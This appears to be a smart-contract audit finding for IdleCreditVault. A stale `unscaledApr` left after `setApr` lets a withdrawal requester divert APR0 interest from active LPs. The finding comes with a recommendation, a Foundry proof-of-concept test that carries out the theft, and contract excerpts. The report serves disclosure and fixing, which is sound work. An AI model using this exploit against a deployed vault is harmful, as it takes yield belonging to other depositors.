### Title
Stale `unscaledApr` after `setApr` lets withdrawal requests steal APR0 interest - (File: `contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`setApr` updates the effective APR but leaves `unscaledApr` unchanged. A withdrawal requested while `unscaledApr` remains `0` is recorded as APR0 even when the vault is earning a positive APR. At `stopEpoch`, the stale zero also bypasses the APR0 lifecycle check and allocates part of realized pool interest to the withdrawal requester, reducing the yield available to active tranche holders.

### Finding Description
`setAprs` and `setAprsWithBuffer` update both `unscaledApr` and `lastApr`, but the public `setApr` path updates only `lastApr`. [1](#0-0)  `requestWithdraw` classifies the request solely from `unscaledApr == 0`, so a stale zero records the receipt in `apr0Users` and `apr0TotalPrincipal` instead of `withdrawsRequests`. [2](#0-1)  `prepareStopEpochWithApr0` then accepts the bucket because it also checks the stale `unscaledApr`, assigns the bucket a pro-rata share of realized interest, increases `pendingWithdraws`, and stores an `apr0RateByEpoch` entry. [3](#0-2)  `_settleApr0` converts that stored rate into additional claimable principal and interest. [4](#0-3) 

This is the same bug class as the external report: replacing a compound configuration updates one component while retaining the other component's stale value.

### Impact Explanation
An unprivileged tranche holder can claim yield that should belong to active LPs. If the stale state is `unscaledApr = 0` while `lastApr > 0`, the holder's pending receipt receives an APR0 share of the epoch interest even though the live vault APR is positive.

For a request basis `P`, active basis `A`, and realized interest `I`, the diverted amount is approximately:

```text
stolenInterest = I * P / (A + P)
```

less the configured performance fee. The amount is paid to the attacker at `claimWithdrawRequest`, while `_expInterest` is reduced by the same net amount before normal epoch accounting. [5](#0-4) 

### Likelihood Explanation
The attack requires an honest manager or CDO configuration path to call `setApr` directly after `unscaledApr` was previously set to zero. `setApr` is explicitly public and callable by the manager, and its documentation describes it as the fixed-APR setter, so using it is a plausible operational action. [6](#0-5)  No malicious privileged behavior, default, oracle manipulation, or external vault failure is required.

### Recommendation
Remove the stale-component state split. Either:

- Make `setApr` update both APR views consistently, or make it internal and require all external updates through `setAprs`/`setAprsWithBuffer`.
- Derive APR0 classification from the same live APR value used for epoch accounting rather than a separately stored `unscaledApr`.
- Add a regression test that calls `setApr(positive)` while `unscaledApr == 0`, creates a withdrawal, and asserts that it is recorded as a normal `withdrawsRequests` entry rather than an APR0 claim.

### Proof of Concept
The following Foundry test can be added to `test/foundry/IdleCreditVault.t.sol`. It mirrors the existing APR0 withdrawal tests and changes only the APR update path to expose the stale component.

```solidity
function testSetAprLeavesStaleApr0AndStealsEpochInterest() external {
  IdleCreditVault creditVault = IdleCreditVault(address(strategy));

  _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, cdoEpoch.managementFee());
  vm.prank(owner);
  cdoEpoch.setIsAYSActive(false);

  // Initialize the paired APR state to APR0.
  vm.prank(manager);
  creditVault.setAprs(0, 0);

  uint256 amount = 10_000 * ONE_SCALE;
  address attacker = makeAddr("stale-apr0-attacker");
  address activeLp = makeAddr("active-lp");

  _depositWithUser(attacker, amount, true);
  _depositWithUser(activeLp, amount, true);

  // Complete epoch 0 so the next request waits through epoch 1.
  _startEpochAndCheckPrices(0);
  vm.warp(cdoEpoch.epochEndDate() + 1);
  deal(defaultUnderlying, borrower, cdoEpoch.expectedEpochInterest());
  vm.prank(manager);
  cdoEpoch.stopEpoch(0, 0);
  _forceLastEpochAprToZero();

  // Honest manager uses the public fixed-APR setter. lastApr changes, but
  // unscaledApr remains zero.
  vm.prank(manager);
  creditVault.setApr(10e18);
  assertEq(creditVault.unscaledApr(), 0);
  assertEq(creditVault.getApr(), 10e18);

  // The attacker is classified into the APR0 bucket despite the positive APR.
  vm.prank(attacker);
  uint256 attackerBasis = cdoEpoch.requestWithdraw(
    IERC20(AAtranche).balanceOf(attacker),
    address(AAtranche)
  );

  (uint256 apr0Principal,,,) = creditVault.apr0Users(attacker);
  assertEq(apr0Principal, attackerBasis, "request was not classified as APR0");
  assertEq(creditVault.withdrawsRequests(attacker), 0);

  _startEpochAndCheckPrices(1);

  uint256 poolInterest = 1_000 * ONE_SCALE;
  uint256 pendingBasis = creditVault.pendingWithdraws();
  uint256 activeBasis = cdoEpoch.getContractValue();

  deal(defaultUnderlying, borrower, pendingBasis + poolInterest);
  vm.warp(cdoEpoch.epochEndDate() + 1);
  vm.prank(manager);
  cdoEpoch.stopEpoch(0, poolInterest);

  uint256 expectedStolenInterest =
    poolInterest * attackerBasis / (activeBasis + attackerBasis);

  uint256 balanceBefore = underlying.balanceOf(attacker);
  vm.prank(attacker);
  cdoEpoch.claimWithdrawRequest();

  assertApproxEqAbs(
    underlying.balanceOf(attacker) - balanceBefore,
    attackerBasis + expectedStolenInterest,
    5,
    "stale APR0 state did not divert epoch interest"
  );
}
```

    address _cdo = idleCDO;

    // if cdo is not yet set we skip the check (this can happen only during the setup)
    if (_cdo != address(0)) {
      if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
    }
    uint256 _maxApr = maxApr;
    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();

  function prepareStopEpochWithApr0(uint256 _interest) external returns (uint256 _expInterest, uint256 _adjPendingWithdrawFees) {
    _onlyIdleCDO();
    IIdleCDOEpochVariant _cdo = IIdleCDOEpochVariant(idleCDO);
    uint256 _pendingFees = _cdo.pendingWithdrawFees();
    uint256 _tvl = _cdo.getContractValue();
    _expInterest = _interest > 1 ? _interest : _cdo.expectedEpochInterest();
    _adjPendingWithdrawFees = _pendingFees;
    // Principal currently waiting for withdraw that was requested while APR was 0,
    // net of the upfront management fee charged at request time.
    uint256 _principal = apr0TotalPrincipal;

    // Fast path: no APR0 accounting needed.
    if (_principal == 0) {
      return (_expInterest, _adjPendingWithdrawFees);
    }
    // APR0 principal is only valid while APR is 0 for that request lifecycle.
    if (unscaledApr != 0) {
      revert NotAllowed();
    }

    uint256 _apr0NetInterest;
    // APR0 allocation is computed only when stopEpoch receives a real override interest.
    // _expectedInterest == 1 is the "request all funds back" sentinel and is handled in IdleCDO.
    if (_expInterest > 1 && _expInterest > _pendingFees) {
      // Remove already booked withdraw fees from the interest base before splitting.
      uint256 _interestNetOfFees = _expInterest - _pendingFees;
      // Total principal used for the pro-rata split:
      // IdleCDO TVL (which excludes APR0 requested principal) + APR0 principal bucket.
      uint256 _totalPrincipalForSplit = _tvl + _principal;
      if (_totalPrincipalForSplit != 0) {
        // APR0 users get a pro-rata share of realized interest.
        uint256 _apr0InterestGross = _interestNetOfFees * _principal / _totalPrincipalForSplit;
        if (_apr0InterestGross != 0) {
          // Same fee model as normal withdraw interest.
          uint256 _apr0Fee = _apr0InterestGross * _cdo.fee() / FULL_ALLOC;
          _apr0NetInterest = _apr0InterestGross - _apr0Fee;
          _adjPendingWithdrawFees += _apr0Fee;
          _expInterest -= _apr0NetInterest;
        }
      }
    }

    // Finalize one-epoch APR0 interest for current epoch only.
    if (_apr0NetInterest != 0) {
      // Funds owed to withdraw requesters increase by APR0 net interest.
      pendingWithdraws += _apr0NetInterest;
      // Save per-epoch net rate; each APR0 request accrues exactly once on its request epoch.
      apr0RateByEpoch[epochNumber] = (_apr0NetInterest * 1e18) / _principal;
    }
    // Close current APR0 bucket so it cannot accrue again on later stopEpoch calls.
    apr0TotalPrincipal = 0;

  function _settleApr0(address _user) internal {
    Apr0UserData storage _apr0User = apr0Users[_user];
    uint256 _principal = _apr0User.principal;
    if (_principal == 0) {
      return;
    }
    uint256 _reqEpoch = _apr0User.principalEpoch;
    // Settle only after stopEpoch bumped epochNumber (ie after one full wait epoch).
    if (_reqEpoch >= epochNumber) {
      return;
    }
    // Move principal from "open APR0 bucket" to "settled bucket" (same principal, not duplicated).
    _apr0User.settledPrincipal += _principal;
    uint256 _rate = apr0RateByEpoch[_reqEpoch];
    if (_rate != 0) {
      // Convert per-epoch rate to claimable underlying interest.
      _apr0User.settledInterest += (_principal * _rate) / 1e18;
    }
    _apr0User.principal = 0;
    _apr0User.principalEpoch = 0;
  }
